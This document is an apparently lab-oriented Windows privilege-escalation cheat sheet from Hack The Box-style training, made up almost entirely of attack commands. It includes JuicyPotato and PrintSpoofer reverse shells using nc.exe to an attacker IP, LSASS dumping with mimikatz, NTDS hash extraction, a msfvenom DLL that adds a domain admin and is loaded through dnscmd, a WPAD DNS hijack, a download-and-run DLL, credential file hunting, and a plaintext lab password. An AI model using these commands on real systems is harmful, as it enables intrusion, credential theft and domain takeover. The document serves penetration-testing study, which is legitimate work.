
### I. Initial Enumeration

#### RDP & Network
```bash
xfreerdp /v:<target ip> /u:htb-student
ipconfig /all
arp -a
route print
netstat -ano 
```

#### AppLocker & Defender
```powershell
Get-MpComputerStatus
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

#### System Info
```powershell
set
systeminfo
wmic qfe
wmic product get name
```

#### Users & Processes
```powershell
tasklist /svc
query user
echo %USERNAME%
whoami /priv
whoami /groups
net user
net localgroup
net localgroup administrators
net accounts
```

#### Named Pipes
```powershell
pipelist.exe /accepteula
gci \\.\pipe\
accesschk.exe /accepteula \\.\Pipe\lsass -v
```

### II. Handy Commands

#### SQL Server
```bash
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
enable_xp_cmdshell
xp_cmdshell whoami
```

#### Privilege Escalation
```bash
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 443 -e cmd.exe" -t *
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

#### LSASS Dumping & Mimikatz
```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

#### File Ownership & ACLs
```powershell
dir /q C:\backups\wwwroot\web.config
takeown /f C:\backups\wwwroot\web.config
Get-ChildItem -Path 'C:\backups\wwwroot\web.config' | select name, directory, @{Name="Owner"; Expression={(Get-ACL $_.Fullname).Owner}}
icacls "C:\backups\wwwroot\web.config" /grant htb-student:F
```

#### Hash Extraction & File Copy
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
robocopy /B E:\Windows\NTDS\ntds ntds.dit
```

#### Event Logs
```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } | Select-Object @{name='CommandLine'; expression={ $_.Properties[8].Value }}
```

#### DLLs, Users, & Services
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
dnscmd.exe /config /serverlevelplugindll adduser.dll
wmic useraccount where name="netadm" get sid
sc.exe sdshow DNS
sc stop dns
sc start dns
```

#### Registry & DNS
```powershell
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
sc query dns
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

#### File Transfer & Execution
```powershell
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

#### Credential Theft - File Search
```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
(Get-PSReadLineOption).HistorySavePath
gc (Get-PSReadLineOption).HistorySavePath
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt
```
